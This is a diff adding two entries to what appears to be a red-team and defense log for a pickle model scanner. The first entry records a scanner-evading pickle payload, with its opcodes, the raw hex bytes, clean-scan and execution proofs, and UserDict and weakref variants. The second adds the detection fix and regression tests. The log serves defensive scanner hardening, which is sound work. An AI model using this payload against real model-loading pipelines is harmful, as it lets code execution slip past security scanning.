@@ -16822,3 +16822,212 @@ Validation:
 - `mypy`: `Success: no issues found in 447 source files`.
 - Full non-slow/non-integration validation:
   `3782 passed, 1022 skipped, 21 warnings in 49.07s`.
+
+## Turn 261 - Bypass via weakref and user mapping materializers
+
+Found another scanner-clean RCE-capable materializer family adjacent to Turn
+259. These clean constructors also consume arbitrary iterables during
+construction, but were not included in the previous source-model fix.
+
+The smallest representative is:
+
+```python
+weakref.WeakSet(iter(builtins.help, "stop"))
+```
+
+During `pickle.loads`, `weakref.WeakSet(...)` consumes the input iterable to add
+weak references. A shadow `pydoc.py` at the front of `sys.path` executes when
+`_sitebuiltins._Helper.__call__` imports `pydoc`, returns a weakrefable `Box`
+instance, then returns the sentinel `"stop"`.
+
+Payload shape:
+
+```text
+PROTO 4
+STACK_GLOBAL builtins iter
+STACK_GLOBAL builtins help
+SHORT_BINUNICODE "stop"
+TUPLE2
+REDUCE              # iter(help, "stop")
+MEMOIZE
+POP
+STACK_GLOBAL weakref WeakSet
+BINGET 0
+TUPLE1
+REDUCE              # WeakSet(call_iterator), drains input immediately
+STOP
+```
+
+Raw payload:
+
+```text
+80048c086275696c74696e738c0469746572938c086275696c74696e738c0468656c70938c0473746f70865294308c077765616b7265668c075765616b53657493680085522e
+```
+
+Scanner proof:
+
+```text
+payload_len 70
+scan clean findings 0 errors ()
+imports [
+  ('builtins', 'iter', 18),
+  ('builtins', 'help', 35),
+  ('weakref', 'WeakSet', 64),
+]
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('weakref', 'WeakSet', 1, 68),
+]
+```
+
+Runtime proof:
+
+```text
+runtime rc 0
+runtime_type WeakSet
+runtime_len 1
+runtime_item_types ['Box']
+marker_exists True
+marker_text owned-by-weakref-weakset
+runtime stderr
+```
+
+Sibling probes stayed scanner-clean and executed the same shadow `pydoc.py`
+marker proof:
+
+```text
+collections.UserDict len 75 scan clean findings 0
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('collections', 'UserDict', 1, 73),
+]
+runtime_type UserDict
+runtime_len 1
+runtime_repr {'owned-key': 'owned-value'}
+
+weakref.WeakKeyDictionary len 80 scan clean findings 0
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('weakref', 'WeakKeyDictionary', 1, 78),
+]
+runtime_type WeakKeyDictionary
+runtime_len 1
+
+weakref.WeakValueDictionary len 82 scan clean findings 0
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('weakref', 'WeakValueDictionary', 1, 80),
+]
+runtime_type WeakValueDictionary
+runtime_len 1
+```
+
+Why it bypasses:
+
+- The native model tracks `iter(help, "stop")` as `StackValue::CallIterator`.
+- Turn 260 modeled several clean construction-time consumers, but
+  `weakref.WeakSet`, `weakref.WeakKeyDictionary`,
+  `weakref.WeakValueDictionary`, and `collections.UserDict` remain ordinary
+  constructed values.
+- These constructors consume iterable inputs through update/add paths during
+  construction, so the hidden callable runs before the object is returned.
+- The Python call graph already knows invoked `builtins.help()` reaches
+  `_sitebuiltins._Helper.__call__ -> builtins.__import__`; the native metadata
+  never emits that hidden invocation for these materializers.
+
+Likely source-level defense:
+
+- Extend `stdlib_eager_call_iterator_consumed_callable(...)` to include
+  `collections.UserDict` and the weakref container constructors.
+- Keep the fix reducer-local by inspecting only reducer callable identity and
+  already-decoded argument stack values.
+- Include runtime regressions that return weakrefable objects for weak
+  containers, since non-weakrefable payload values raise before a stable result.
+
+Performance note:
+
+- The representative payload is 70 bytes.
+- Warm scan median over 1000 runs was `0.000054s`, p95 `0.000064s`, and max
+  `0.000180s`.
+
+## Turn 262 - Defense for weakref and UserDict materializers
+
+Defensive follow-up for Turn 261. The fix stays at the call-graph source:
+`stdlib_eager_call_iterator_consumed_callable(...)` now treats
+`collections.UserDict`, `weakref.WeakSet`, `weakref.WeakKeyDictionary`, and
+`weakref.WeakValueDictionary` as construction-time iterable consumers when
+their single argument is a `StackValue::CallIterator`.
+
+Regression coverage:
+
+- Added `collections.UserDict(iter(help, "stop"))` to the existing stdlib
+  materializer regression matrix.
+- Added weakref regressions for `WeakSet`, `WeakKeyDictionary`, and
+  `WeakValueDictionary`; runtime proofs use weakrefable objects so the
+  constructor drains the iterator and returns a stable object.
+- The tests assert both scanner detection and real child-process
+  `pickle.loads(...)` execution against a shadow `pydoc.py` marker.
+
+Post-fix scanner proof for the Turn 261 representative:
+
+```text
+payload_len 70
+scan malicious findings 1 errors ()
+imports [
+  ('builtins', 'iter', 18),
+  ('builtins', 'help', 35),
+  ('weakref', 'WeakSet', 64),
+]
+invocations [
+  ('builtins', 'iter', 2, 18, 43),
+  ('weakref', 'WeakSet', 1, 64, 68),
+  ('builtins', 'help', 0, 35, 68),
+]
+finding DANGEROUS_CALL_GRAPH
+  _sitebuiltins._Helper.__call__ -> builtins.__import__
+```
+
+Runtime proof remains executable, confirming this blocks detection rather than
+invalidating the payload:
+
+```text
+runtime rc 0
+runtime_type WeakSet
+runtime_len 1
+runtime_item_types ['Box']
+marker_exists True
+marker_text owned-by-weakref-weakset
+runtime stderr
+```
+
+Performance note:
+
+- The defense is an O(1) reducer-identity match plus reuse of the already
+  decoded call-iterator argument.
+- Warm post-fix scan timing over 1000 runs: median `0.000115s`, p95
+  `0.000122s`, max `0.000206s`.
+
+Validation:
+
+```text
+cargo test --manifest-path packages/modelaudit-picklescan/Cargo.toml
+78 passed
+
+pytest targeted materializer regressions
+8 passed in 0.53s
+
+pytest packages/modelaudit-picklescan/tests/test_call_graph_import_statements.py -q
+71 passed in 1.87s
+
+pytest packages/modelaudit-picklescan/tests/test_call_graph_*.py -q
+109 passed in 3.56s
+
+pytest adjacent adversarial spot-checks
+2 passed in 0.59s
+
+ruff format/check, mypy
+format applied to 1 test file; lint clean; mypy clean across 447 files
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
+3786 passed, 1022 skipped, 21 warnings in 43.17s
+```
